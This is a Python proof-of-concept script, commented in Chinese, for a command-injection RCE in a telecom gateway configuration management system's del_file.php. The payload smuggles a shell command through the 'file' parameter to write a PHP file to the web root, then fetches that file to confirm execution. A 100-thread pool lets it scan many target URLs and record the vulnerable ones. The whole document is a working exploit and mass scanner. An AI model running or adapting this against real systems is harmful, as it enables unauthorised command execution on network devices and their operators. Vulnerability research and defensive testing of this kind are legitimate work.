#电信网关配置管理系统 del_file.php RCE漏洞复现
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="电信网关配置管理系统 del_file.php RCE漏洞复现")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/manager/newtpl/del_file.php?file=1.txt|echo%20o8nahpm39boa2gs%20%3E%20abcwavkww.php"
    url = target+payload
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive"}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    payload1 ="/manager/newtpl/abcwavkww.php"
    url1=target+payload1
    headers1 ={"User-Agent": "Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15", "Connection": "close", "Accept-Encoding": "gzip"}
    try:
        res = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.get(url=url1,headers=headers1,proxies=proxies,verify=False,timeout=10)
            if  "o8nahpm39boa2gs" in res1.text:
                print(f'[+]该url{target}存在漏洞')
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f'该url{target}不存在漏洞')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()